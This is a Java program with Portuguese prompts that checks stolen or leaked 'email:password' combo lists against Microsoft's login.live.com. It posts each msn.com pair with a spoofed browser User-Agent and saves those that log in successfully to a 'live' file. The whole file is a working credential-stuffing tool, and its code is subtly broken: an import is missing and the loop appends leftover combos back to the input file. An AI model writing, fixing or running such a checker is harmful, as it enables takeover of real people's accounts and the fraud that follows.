import java.net.URI;
import java.net.http.*;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.io.*;
import java.nio.file.*;
import java.nio.charset.StandardCharsets;

public class MSNCheck {

    private static final Random random = new Random();
    private static final String COMBO_FILE = "contas";
    private static final String LIVE_FILE = "live";

    public static void check(String info) {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest.Builder requestBuilder = HttpRequest.newBuilder();
        HttpRequest request;
        HttpResponse<String> response;

        try {
            request = requestBuilder
                .uri(URI.create("https://login.live.com/login.srf"))
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
                .header("Pragma", "no-cache")
                .header("Accept", "*/*")
                .build();

            response = client.send(request, HttpResponse.BodyHandlers.ofString());
            TimeUnit.SECONDS.sleep(1);

            String[] splited = info.split(":");
            String user = splited[0];
            String passw = splited[1];

            String uaid = extractValue(response.body(), "&uaid=", '\"');
            String pid = extractValue(response.body(), "&pid=", '\'');

            HttpRequest postRequest = requestBuilder
                .uri(URI.create("https://login.live.com/ppsecure/post.srf"))
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko")
                .header("Pragma", "no-cache")
                .header("Accept", "*/*")
                .POST(HttpRequest.BodyPublishers.ofString(
                    "login=" + user + "&passwd=" + passw + "&contextid=" + extractValue(response.body(), "https://login.live.com/login.srf?contextid=", '&')
                ))
                .build();

            response = client.send(postRequest, HttpResponse.BodyHandlers.ofString());

            if (response.body().contains("PPAuth") || response.body().contains("WLSSC")) {
                saveToFile(LIVE_FILE, "SMT Valid | Email: " + user + " | Password: " + passw);
                System.out.println("Valid: " + user);
            } else {
                saveToFile(COMBO_FILE, info);
                System.out.println("Invalid: " + user);
            }

        } catch (Exception e) {
            saveToFile(COMBO_FILE, info);
            System.err.println("Error: " + e.getMessage());
        }
    }

    private static String extractValue(String text, String start, char end) {
        int startIndex = text.indexOf(start) + start.length();
        int endIndex = text.indexOf(end, startIndex);
        return text.substring(startIndex, endIndex);
    }

    private static void saveToFile(String filename, String data) {
        try {
            Files.write(Paths.get(filename + ".txt"), (data + "\n").getBytes(StandardCharsets.UTF_8), 
                        StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException e) {
            System.err.println("Error saving to file: " + e.getMessage());
        }
    }

    public static void main(String[] args) {
        try {
            int loaded = Files.readAllLines(Paths.get(COMBO_FILE + ".txt")).size();
            System.out.println("Loaded " + loaded + " accounts");

            while (true) {
                List<String> lines = Files.readAllLines(Paths.get(COMBO_FILE + ".txt"));
                if (lines.isEmpty()) {
                    System.out.println("Acabou");
                    break;
                }
                
                String info = lines.get(0).trim();
                saveToFile(COMBO_FILE, String.join("\n", lines.subList(1, lines.size())));

                if (info.contains("msn.com")) {
                    check(info);
                }
            }

        } catch (Exception e) {
            System.err.println("Error: " + e.getMessage());
        }

        System.out.println("Pressione qualquer tecla para continuar. . .");
        try {
            System.in.read();
        } catch (IOException e) {
            System.err.println("Erro ao ler entrada: " + e.getMessage());
        }
    }
}
